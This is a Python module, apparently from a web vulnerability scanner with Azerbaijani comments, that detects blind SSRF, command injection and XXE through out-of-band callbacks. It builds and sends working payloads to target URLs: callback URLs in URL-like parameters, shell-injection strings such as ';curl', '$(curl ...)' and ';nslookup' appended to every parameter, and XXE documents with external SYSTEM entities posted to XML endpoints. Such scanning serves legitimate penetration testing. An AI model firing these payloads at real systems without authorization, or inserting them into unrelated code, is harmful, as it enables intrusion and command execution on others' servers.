"""
MODUL: OOB (Out-of-Band) — Blind SSRF / RCE / XXE
=================================================
Callback (geri sorğu) üsulu ilə KOR zəiflikləri təsdiqləyir.
Hədəf bizim collaborator URL-imizə sorğu edirsə -> zəiflik 100% real.
"""

import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core import http_client, oob

URL_PARAMLAR = ("url", "uri", "link", "target", "dest", "redirect", "fetch",
                "image", "img", "load", "proxy", "callback", "webhook", "feed",
                "site", "host", "domain", "path", "file", "data", "source", "src")

XXE_YOLLAR = ["", "/api", "/api/xml", "/xml", "/soap", "/xmlrpc.php", "/upload"]


def _xost(cb):
    return cb.split("://", 1)[-1]


def yoxla(parametrli_url, bas_url, oob_base, hesabat, timeout=8):
    if not oob_base:
        return
    tokenlar = []   # (token, kod, yer, param)

    # 1) BLIND SSRF — url-bənzər parametrlərə callback URL qoy
    for url in parametrli_url:
        parcalar = urlparse(url)
        params = parse_qs(parcalar.query)
        for p in params:
            if p.lower() not in URL_PARAMLAR:
                continue
            tok = oob.yeni_token()
            cb = f"{oob_base}/oob/{tok}"
            yeni = {k: v[0] for k, v in params.items()}
            yeni[p] = cb
            turl = urlunparse(parcalar._replace(query=urlencode(yeni)))
            http_client.al(turl, timeout=timeout)
            tokenlar.append((tok, "ssrf_oob", turl, p))

    # 2) BLIND RCE — ;curl callback (command injection, kor)
    for url in parametrli_url:
        parcalar = urlparse(url)
        params = parse_qs(parcalar.query)
        for p in params:
            tok = oob.yeni_token()
            cb = f"{oob_base}/oob/{tok}"
            host = _xost(cb)
            for pl in (f";curl {cb}", f"|curl {cb}", f"$(curl {cb})",
                       f"`curl {cb}`", f"&& curl {cb}", f";nslookup {host}"):
                yeni = {k: v[0] for k, v in params.items()}
                yeni[p] = yeni[p] + pl
                turl = urlunparse(parcalar._replace(query=urlencode(yeni)))
                http_client.al(turl, timeout=timeout)
            tokenlar.append((tok, "rce_oob", url, p))

    # 3) BLIND XXE — xarici entity callback-ı çəkir
    if bas_url:
        bas = bas_url.rstrip("/")
        for yol in XXE_YOLLAR:
            tok = oob.yeni_token()
            cb = f"{oob_base}/oob/{tok}"
            payload = (f'<?xml version="1.0"?>'
                       f'<!DOCTYPE r [<!ENTITY x SYSTEM "{cb}">]><r>&x;</r>')
            http_client.al(bas + yol, metod="POST", timeout=timeout,
                           data=payload, headers={"Content-Type": "application/xml"})
            tokenlar.append((tok, "xxe_oob", bas + yol, None))

    if not tokenlar:
        return

    # Callback-ların gəlməsinə möhlət ver, sonra yoxla
    time.sleep(6)
    for tok, kod, yer, param in tokenlar:
        if oob.vuruldu(tok):
            if param:
                hesabat.elave_et("kritik", kod, yer, param=param)
            else:
                hesabat.elave_et("kritik", kod, yer)
        oob.temizle(tok)
